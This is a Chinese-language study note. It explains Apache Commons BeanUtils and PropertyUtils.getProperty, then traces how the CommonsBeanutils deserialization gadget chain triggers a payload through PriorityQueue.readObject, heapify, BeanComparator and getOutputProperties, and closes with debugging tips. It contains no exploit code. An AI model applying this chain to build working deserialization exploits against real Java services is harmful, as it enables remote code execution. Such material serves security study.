commons-beanutils

commons-beanutils中诸如此类的辅助方法有很多，如调用setter、拷贝属性等

  1. Apache Commons Beanutil 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法
  2. 什么是JavaBean from wiki百科: 一个数据结构的封装
    1. 有一个public的无参数构造函数
    2. 属性可以透过get、set、is（可替代get，用在布尔型属性上）方法或遵循特定命名规则的其他方法访问。
    3. 可序列化。
  3. commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任
    意JavaBean的getter方法: PropertyUtils.getProperty(new Cat(), "name");会自动找到name属性的getter方法，也就是 getName，而且可以调用函数
  4. 支持递归: 可以通过 PropertyUtils.getProperty(a, "b.c"); 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用

Q: 为什么反射设置new Object[] {paylaodObj, payloadObj2}为不同的顺序仍然会触发

其实不用太纠结这种小细节，实战中的标准在于!!!保证触发!!! –> 只要能触发就是好payload

  1. 明确一下目的，断点打在PriorityQueue的readObject()

  2. 进入发现不同顺序的话在heapify()之前都是按照我们设置的顺序来的，所以问题在之后

  3. 进入heapify()，推测报错时应该时触发，一直调到报错，进入函数，发现在比较时顺序也是按照设置的那样

  4. A: 问题出在其实为不设置getOutputProperties()这里触发payload也不会报错，所以最终还是会到触发payload那里，也算是清晰了

Debug之法大也

  1. 明确目的
  2. 先找到入口点，别一开始就太过精确死磕某个点，直接从外部包围内部
    1. 比如这里调试先别一下到BeanComparator的compare()里，而是先到PriorityQueue的readObject()这里，跟着流走
  3. 不断明确在每一步中有哪里不对，这一步不清楚可以想想以前的
  4. 先宏观再整体，可以推测是否再报错时出现问题，如果时先找报错点进入，有时可以先跳过具体先看流后面来夹逼定位
  5. 如果一直徘徊而且是不知道原因的，可以往前看，像这里的顺序问题，找到readObject那里就清晰了
